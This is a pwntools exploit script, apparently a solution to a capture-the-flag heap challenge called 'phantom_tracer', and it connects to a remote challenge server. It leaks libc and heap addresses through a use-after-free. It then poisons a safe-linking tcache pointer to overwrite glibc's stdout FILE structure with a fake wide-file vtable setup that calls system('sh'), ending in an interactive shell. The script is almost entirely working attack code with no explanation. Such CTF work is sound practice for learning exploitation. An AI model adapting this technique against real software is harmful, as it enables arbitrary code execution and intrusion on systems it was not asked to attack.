from pwn import *

elf = ELF("./phantom_tracer_patched")
libc = ELF("./libc.so")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["konsole", "-e"]

# p = process()
p = remote("chals.tisc-dc26.csit-events.sg", 31629)

def create(size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())

def edit(index, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(index).encode())
    p.sendlineafter(b': ', data)

def free(index):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(index).encode())

def read(index):
    p.sendlineafter(B'> ', b'4')
    p.sendlineafter(b': ', str(index).encode())
    p.recvuntil(b'recovered:\n')

    return p.recvuntil(b'PHANTOM', drop=True).strip()

def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

create(0x438)
create(0x200)
create(0x200)

free(0)
free(1)

print(read(0))
libc_base = u64(b' ' + read(0)[:7]) - libc.symbols['main_arena'] - 96
heap_base = u64(read(1)[:8]) << 12

free(2)

edit(2, flat(
    encrypt(heap_base + 2288, libc_base + libc.symbols['_IO_2_1_stdout_'])
))

create(0x200)
create(0x200)

context.log_level = 'debug'
# gdb.attach(p)
libc.address = libc_base
edit(4, flat({
    0x00: b"  sh;",
    0x20: 0x0,
    0x28: 0x1,
    0x88: libc.sym._IO_stdfile_1_lock,
    0xa0: libc.sym._IO_2_1_stdout_-0x10,
    0xc0: 0x0,
    0xd8: libc.sym._IO_wfile_jumps-0x20,
 
    0x18 - 0x10: 0x0,
    0x30 - 0x10: 0x0, # actually redundant - 0x20 is already set
    0xe0 - 0x10: libc.sym._IO_2_1_stdout_,
 
    0x68: libc.sym.system
}))

print(hex(libc_base))
print(hex(heap_base))

p.interactive()
